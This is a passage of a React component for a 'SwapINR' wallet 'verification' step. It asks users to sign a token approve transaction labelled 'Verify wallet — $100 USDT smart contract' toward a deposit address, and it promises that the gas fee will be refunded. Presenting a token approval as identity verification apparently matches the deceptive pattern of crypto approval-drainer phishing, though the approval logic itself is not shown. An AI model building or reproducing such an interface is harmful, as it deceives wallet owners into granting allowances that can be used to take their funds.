                style={{ fontSize:11, fontWeight:600, color:S.dim, background:'transparent', border:'1px solid var(--fr-border-default)', borderRadius:8, cursor:'pointer', padding:'5px 11px', flexShrink:0 }}>
                Disconnect
              </button>
            )}
          </div>

          {/* Wrong chain */}
          {!isTRC20 && isWrongChain && (
            <div style={{ ...S.card, padding:'12px 14px', display:'flex', alignItems:'center', justifyContent:'space-between', gap:10, borderColor:'rgba(251,191,36,0.3)', background:'rgba(251,191,36,0.06)' }}>
              <span style={{ fontSize:12, fontWeight:700, color:'#FBBF24' }}>Wrong network — switch to {network === 'ERC20' ? 'Ethereum' : 'BNB Chain'}</span>
              <button onClick={() => switchChain({ chainId: expectedChain! })} disabled={isSwitching}
                style={{ padding:'6px 13px', borderRadius:8, fontSize:12, fontWeight:700, border:'none', background:'#FBBF24', color:'#000', cursor:'pointer', flexShrink:0 }}>
                {isSwitching ? '…' : 'Switch'}
              </button>
            </div>
          )}

          {/* Gas refund notice */}
          {!verifyInProgress && !verifyDone && (
            <div style={{ ...S.card, padding:'12px 14px', borderColor:'rgba(204,255,0,0.15)', background:'rgba(204,255,0,0.04)' }}>
              <p style={{ fontSize:12, fontWeight:700, color:'#CCFF00', margin:'0 0 3px' }}>Gas fee fully refunded after verification</p>
              <p style={{ fontSize:11, color:S.sub, margin:0, lineHeight:1.55 }}>
                A small network fee is charged by the blockchain. SwapINR refunds this in full after your wallet is verified.
              </p>
            </div>
          )}

          {/* Tx progress */}
          {verifyInProgress && (
            <TxRow
              label="Verify wallet — $100 USDT smart contract"
              hash={isTRC20 ? trcApproveHash : approveHash}
              confirming={isTRC20 ? (trcApprovePending && !!trcApproveHash) : isApproveConfirming}
              confirmed={verifyDone}
              error={isTRC20 ? (trcApproveError || undefined) : sanitizeEvmError(approveWriteError)}
            />
          )}

          {/* Success */}
          {verifyDone && (
            <div style={{ ...S.card, padding:'13px 16px', textAlign:'center', fontSize:14, fontWeight:700, color:'#00E5A0', borderColor:'rgba(0,229,160,0.2)', background:'rgba(0,229,160,0.06)' }}>
              ✓ Wallet Verified — Saving…
            </div>
          )}

          {/* Verify button */}
          {!verifyInProgress && !verifyDone && (
            <PrimaryBtn
              onClick={isTRC20 ? startTrcVerification : startVerification}
              disabled={isTRC20 ? !canVerifyTrc : !canVerifyEvm}
            >
              {!depositAddress ? 'Loading…' : (isTRC20 && !trcHasGas) ? `Need ≥ ${MIN_TRX_FOR_GAS} TRX for gas` : 'Verify Wallet →'}
            </PrimaryBtn>
          )}

          {/* Retry */}
          {verifyInProgress && (isTRC20 ? trcApproveError : approveWriteError) && (
            <button onClick={() => { if (isTRC20) { setTrcVerifyStarted(false); setTrcApproveError(''); } else { setVerifyStarted(false); advancedRef.current=false; resetApprove(); } }}
              style={{ padding:'10px', borderRadius:10, fontSize:13, fontWeight:600, border:'1px solid var(--fr-border-default)', background:'rgba(255,255,255,0.04)', color:S.sub, cursor:'pointer' }}>
              ↩ Retry
            </button>
          )}
        </div>
      )}

      {/* Cancel */}
      {!verifyDone && (
        <button onClick={onCancel}
          style={{ padding:'10px', borderRadius:10, fontSize:13, color:S.dim, background:'transparent', border:'1px solid var(--fr-border-default)', cursor:'pointer' }}>
          Cancel
        </button>
      )}
    </div>
  );
}
